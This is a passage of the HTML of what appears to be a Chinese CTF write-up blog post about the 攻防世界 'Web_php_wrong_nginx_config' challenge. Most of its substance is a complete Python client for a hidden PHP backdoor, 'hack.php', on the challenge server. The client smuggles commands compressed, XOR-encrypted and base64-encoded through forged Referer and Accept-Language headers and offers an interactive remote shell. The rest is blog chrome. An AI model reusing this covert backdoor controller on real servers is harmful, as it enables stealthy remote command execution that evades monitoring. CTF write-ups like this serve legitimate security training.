class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random import randint,choice</span><br><span class="line"><span class="keyword">from</span> hashlib import md5</span><br><span class="line">import urllib</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">import zlib</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def choicePart(seq,amount):</span><br><span class="line">    length = len(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Error Input&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line">    result = []</span><br><span class="line">    indexes = []</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = randint(<span class="number">0</span>,length<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">if</span> not i in indexes:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">            result.append(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">def randBytesFlow(amount):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in xrange(amount):</span><br><span class="line">        result += chr(randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span>  result</span><br><span class="line"></span><br><span class="line">def randAlpha(amount):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in xrange(amount):</span><br><span class="line">        result += choice(<span class="keyword">string</span>.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">def loopXor(text,key):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    lenKey = len(key)</span><br><span class="line">    lenTxt = len(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt&lt;lenTxt <span class="keyword">and</span> iKey&lt;lenKey:</span><br><span class="line">            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debugPrint(msg):</span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">debugging = <span class="literal">False</span></span><br><span class="line">keyh = <span class="string">&quot;42f7&quot;</span> <span class="comment"># $kh</span></span><br><span class="line">keyf = <span class="string">&quot;e9ac&quot;</span> <span class="comment"># $kf</span></span><br><span class="line">xorKey = keyh + keyf</span><br><span class="line">url = <span class="string">&#x27;http://220.249.52.133:40004/hack.php&#x27;</span></span><br><span class="line">defaultLang = <span class="string">&#x27;zh-CN&#x27;</span></span><br><span class="line">languages = [<span class="string">&#x27;zh-TW;q=0.%d&#x27;</span>,<span class="string">&#x27;zh-HK;q=0.%d&#x27;</span>,<span class="string">&#x27;en-US;q=0.%d&#x27;</span>,<span class="string">&#x27;en;q=0.%d&#x27;</span>]</span><br><span class="line">proxies = None <span class="comment"># &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # proxy for debug</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random Accept-Language only once each session</span></span><br><span class="line">langTmp = choicePart(languages,<span class="number">3</span>)</span><br><span class="line">indexes = sorted(choicePart(range(<span class="number">1</span>,<span class="number">10</span>),<span class="number">3</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]</span><br><span class="line"><span class="keyword">for</span> i in xrange(<span class="number">3</span>):</span><br><span class="line">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class="line">acceptLangStr = <span class="string">&#x27;,&#x27;</span>.join(acceptLang)</span><br><span class="line">debugPrint(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>] <span class="comment"># $i</span></span><br><span class="line">md5head = (md5(init2Char + keyh).hexdigest())[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">md5tail = (md5(init2Char + keyf).hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + randAlpha(randint(<span class="number">3</span>,<span class="number">8</span>))</span><br><span class="line">debugPrint(<span class="string">&#x27;$i is %s&#x27;</span> % (init2Char))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 head: %s&#x27;</span> % (md5head,))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 tail: %s&#x27;</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive php shell</span></span><br><span class="line">cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    <span class="comment"># build junk data in referer</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i in xrange(max(indexes)+<span class="number">1</span>+randint(<span class="number">0</span>,<span class="number">2</span>)):</span><br><span class="line">        key = randAlpha(randint(<span class="number">3</span>,<span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="number">3</span>,<span class="number">12</span>)))</span><br><span class="line">        query.append((key, value))</span><br><span class="line">    debugPrint(<span class="string">&#x27;Before insert payload:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(urllib.urlencode(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encode payload</span></span><br><span class="line">    payload = zlib.compress(cmd)</span><br><span class="line">    payload = loopXor(payload,xorKey)</span><br><span class="line">    payload = base64.urlsafe_b64encode(payload)</span><br><span class="line">    payload = md5head + payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cut payload, replace into referer</span></span><br><span class="line">    cutIndex = randint(<span class="number">2</span>,len(payload)<span class="number">-3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>],payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    referer = url + <span class="string">&#x27;?&#x27;</span> + urllib.urlencode(query)</span><br><span class="line">    debugPrint(<span class="string">&#x27;After insert payload, referer is:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send request</span></span><br><span class="line">    r = sess.get(url,headers=&#123;<span class="string">&#x27;Accept-Language&#x27;</span>:acceptLangStr,<span class="string">&#x27;Referer&#x27;</span>:referer&#125;,proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span class="line">    debugPrint(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># process response</span></span><br><span class="line">    pattern = re.compile(r<span class="string">&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xorKey,xorKey))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="keyword">if</span> len(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Error,  no backdoor response&#x27;</span></span><br><span class="line">        cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    debugPrint(output)</span><br><span class="line">    output = output.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">    output = loopXor(output,xorKey)</span><br><span class="line">    output = zlib.decompress(output)</span><br><span class="line">    <span class="keyword">print</span> output</span><br><span class="line">    cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>成功执行命令，<br><img src="https://img-blog.csdnimg.cn/20200811160111249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200811160037767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+            </div>
+            
+                <div class="kratos-copyright text-center clearfix">
+                    <h5>本作品采用 <a rel="license nofollow" target="_blank" href="http://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+                </div>
+            
+            <footer class="kratos-entry-footer clearfix">
+                
+                    <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                    
+                        <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                    
+                    
+                        <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                        <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://wumingzhilian.github.to/2020/08/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAWeb-php-wrong-nginx-config%E8%AF%A6%E8%A7%A3/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://wumingzhilian.github.to/2020/08/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAWeb-php-wrong-nginx-config%E8%AF%A6%E8%A7%A3/";
+            const title         = "「攻防世界web进阶区Web_php_wrong_nginx_config详解」";
+            const excerpt       = `题目打开发现无论我们输入什么他都会弹出网站建设不完全
+那么我们使用御剑进行扫描，扫描到了admin和robots.txt我们访问admin试试
+我们接着访问hint.php
+和Hack.php
+这个打开直接弹窗
+详解好嘞，我们正式开搞...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                    
+                    </div>
+                
+                <div class="footer-tag clearfix">
+                    <div class="pull-left">
+                    <i class="fa fa-tags"></i>
+                        <a class="tag-none-link" href="/tags/web%E8%BF%9B%E9%98%B6%E5%8C%BA/" rel="tag">web进阶区</a>, <a class="tag-none-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a>
+                    </div>
+                    <div class="pull-date">
+                    <span>最后编辑：2020-08-11</span>
+                    </div>
+                </div>
+            </footer>
+        </div>
+        
+            <nav class="navigation post-navigation clearfix" role="navigation">
+                
+                <div class="nav-previous clearfix">
+                    <a title=" 攻防世界web进阶区i-got-id-200超详解" href="/2020/08/10/攻防世界web进阶区i-got-id-200超详解/">&lt; 上一篇</a>
+                </div>
+                
+                
+            </nav>
+        
+        
+            <div id="disqus_thread"></div>
+<script>
+    $(function(){
+        window.DISQUS = null;
+        new DisqusJS({
+            shortname: '',
+            siteName: '',
+            identifier: '2020/08/11/攻防世界web进阶区Web-php-wrong-nginx-config详解/',
+            url: 'http://wumingzhilian.github.to/2020/08/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAWeb-php-wrong-nginx-config%E8%AF%A6%E8%A7%A3/',
+            api: '',
+            apikey: '',
+            admin: '',
+            adminLabel: ''
+        });
+    });
+</script>
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://github.com/SukkaW/DisqusJS">comments powered by DisqusJS.</a></noscript>
+        
+    </article>
+</section>
+</div>
+        
+            <section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+                
+                    <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.png" />
+        </div>
+    </div>
+    <div class="textwidget">
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">详解</span></a></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+                    <!-- Moved to about.ejs -->
+                
+                    
+  <aside id="krw-categories" class="widget widget-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/XSS-Labs/">XSS-Labs</a><span class="category-list-count">2</span></li></ul>
+  </aside>
+
+
+                
+                    
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/CTF/" style="font-size: 0.67em;">CTF</a> <a href="/tags/WEB/" style="font-size: 0.6em;">WEB</a> <a href="/tags/XSS-Labs/" style="font-size: 0.6em;">XSS-Labs</a> <a href="/tags/web%E8%BF%9B%E9%98%B6%E5%8C%BA/" style="font-size: 0.73em;">web进阶区</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.8em;">攻防世界</a>
+      </div>
+  </aside>
+
+                
+                    
+  <aside id="krw-posts" class="widget widget-kratos-poststab">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+          <a class="list-group-item" href="/2020/08/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAWeb-php-wrong-nginx-config%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区Web_php_wrong_nginx_config详解</a>
+        
+          <a class="list-group-item" href="/2020/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAi-got-id-200%E8%B6%85%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区i-got-id-200超详解</a>
+        
+          <a class="list-group-item" href="/2020/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAunfinish%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区unfinish详解</a>
+        
+          <a class="list-group-item" href="/2020/08/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAics-07%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区ics-07详解</a>
+        
+          <a class="list-group-item" href="/2020/08/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAbug%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区bug详解</a>
+        
+      </ul>
+  </div>
+  </aside>
+
+                
+            </section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer">
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://t.me/wumingzhilian"><i class="fa fa-telegram"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/wumingzhilian"><i class="fa fa-twitter"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/wumingzhilian"><i class="fa fa-github"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="/atom.xml"><i class="fa fa-rss"></i></a></li>
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2020 wuming 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Made with <i class="fa fa-heart throb" style="color:#d43f57"></i> by <a href="https://candinya.com" target="_blank" rel="nofollow">Candinya</a>.</li>
+                        </div>
+                        <div>
+                            <li>Hosted by <a href="https://github.io" target="_blank">Github Pages</a></li>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+<script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script>
+
+<script async src="/js/candy.min.js"></script>
+
+    <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    <div id="aplayer"></div>
+<script>
+$.ajax({
+    type:"get",
+    url:"",
+    dataType:"json",
+    success: function(data){
+        new APlayer({
+            container: document.getElementById('aplayer'),
+            fixed: true,
+            order: 'random',
+            lrcType: 3,
+            audio: data
+        });
+    }
+});
+</script>
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+</body>
+</html>
